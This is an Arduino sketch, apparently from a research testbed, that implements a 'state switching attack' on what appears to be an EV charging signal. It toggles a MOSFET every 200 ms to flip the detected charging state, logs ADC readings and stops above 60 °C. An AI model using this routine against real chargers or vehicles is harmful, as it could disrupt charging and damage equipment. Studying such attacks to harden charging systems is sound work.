const int STATE_DET_PIN = A0; // Pin for state detection input
const int REALLOAD_PIN = 13; // Pin for real load mosfet control(M1)
const int SS_PIN = 7; // Pin for state switching mosfet control(M3)
const int TEMP_PIN = A1; // Pin for temperature sensor input


//intialize state switching
void stateSwitchingInit() {
    pinMode(SS_PIN, OUTPUT);
    digitalWrite(SS_PIN, LOW); // Start with state switching mosfet off
    }


// ADC thresholds (0–1023, scaled to 0–5 V)
const int STATE_A_MIN = 900;   // ~4.4–5.0 V
const int STATE_B_MIN = 675;   // ~3.3–4.4 V
const int STATE_C_MIN = 430;   // ~2.1–3.3 V
const int STATE_D_MIN = 200;   // ~0.9–2.1 V
const int STATE_E_MAX = 50;    // ~0 V

//timing constants (in milliseconds)
#define REALLOAD_TIME_MS       1000     // ~1 PWM period
#define SS_TIME_MS             200

#define TEMP_THRESHOLD_HIGH 60.0 // High temperature threshold in Celsius

//globlal variables
//bool realLoad;
bool stateSwitching = false;
unsigned long attackTimer = 0;

//for temperature tracking
float maxTempRecorded = 0.0;


//Initialize temperature sensor
void tempInit() {
  pinMode(TEMP_PIN, INPUT);
  Serial.println("Temperature sensor initialized");
}

//Read temperature from sensor
float readTemperature() {
  float currentTemp ;
 long sum = 0;
  for (int i = 0; i < 10; i++) {
    sum += analogRead(TEMP_PIN);
    delay(2);
  }
   float voltage = sum / 10.0 * (5.0 / 1023.0);

  float temp = (voltage - 0.5) * 100;
  currentTemp = temp;

  // Update max temperature recorded
  if (currentTemp > maxTempRecorded) {
    maxTempRecorded = currentTemp;
  }

  return currentTemp;
}

//check if temperature is safe
bool isTemperatureSafe(float temp) {
  return temp < TEMP_THRESHOLD_HIGH;
}

void setup() {

pinMode(STATE_DET_PIN, INPUT);  
pinMode(REALLOAD_PIN, OUTPUT);
digitalWrite(REALLOAD_PIN, LOW);
tempInit();
stateSwitchingInit();

 Serial.begin(9600);
 Serial.println("System Initialized");
  delay(500);
attackTimer = millis();
}

//StateC detector
bool isStateC() {
    int adcValue = analogRead(STATE_DET_PIN);
  Serial.print("ADC Value: ");
  Serial.println(adcValue);
    return (adcValue >= STATE_C_MIN && adcValue < STATE_B_MIN);
}

//Helper functions 

// Only real EV load connected
void realLoadOnly() {
  digitalWrite(REALLOAD_PIN, LOW);   // M1 ON
  //digitalWrite(FAKELOAD_PIN, LOW);   // M2 OFF
  digitalWrite(SS_PIN, LOW);        // M3 OFF
}

// State switching attack
void stateSwitchingOnly() {
  digitalWrite(REALLOAD_PIN, LOW);   // M1 ON
  //digitalWrite(FAKELOAD_PIN, LOW);    // M2 OFF
  digitalWrite(SS_PIN, HIGH);// M3 ON
}

void loop() {
   // keep EV load connected
 digitalWrite(REALLOAD_PIN, LOW);
  
     unsigned long elapsed = millis() - attackTimer;
    Serial.print("Elapsed: "); Serial.println(elapsed);
  

  if(elapsed >= SS_TIME_MS) {
    Serial.print("millis: "); Serial.println(millis());
    Serial.print("attackTimer: "); Serial.println(attackTimer);

    attackTimer = millis();
    
   

    stateSwitching = !stateSwitching;

   if (stateSwitching) {

    // read temperature only when state switching is ON
            float temp = readTemperature();
            Serial.print("Temperature: "); Serial.print(temp); Serial.println(" C");
            Serial.print("Max Temp: "); Serial.print(maxTempRecorded); Serial.println(" C");

            // temperature safety check
            if (!isTemperatureSafe(temp)) {
                Serial.println("TEMPERATURE TOO HIGH - stopping attack!");
                stateSwitching = false;
                realLoadOnly();
                attackTimer = millis();
                delay(200);
                return;
            }
      Serial.println("State Switching ON");
      digitalWrite(SS_PIN, HIGH);
      Serial.print("SS PIN state: ");
  Serial.println(digitalRead(SS_PIN));
      
    } 
    else {
      Serial.println("State Switching OFF");
      digitalWrite(SS_PIN, LOW);
      Serial.print("SS PIN state: ");
  Serial.println(digitalRead(SS_PIN));
    }
  }
  delay(100);
}

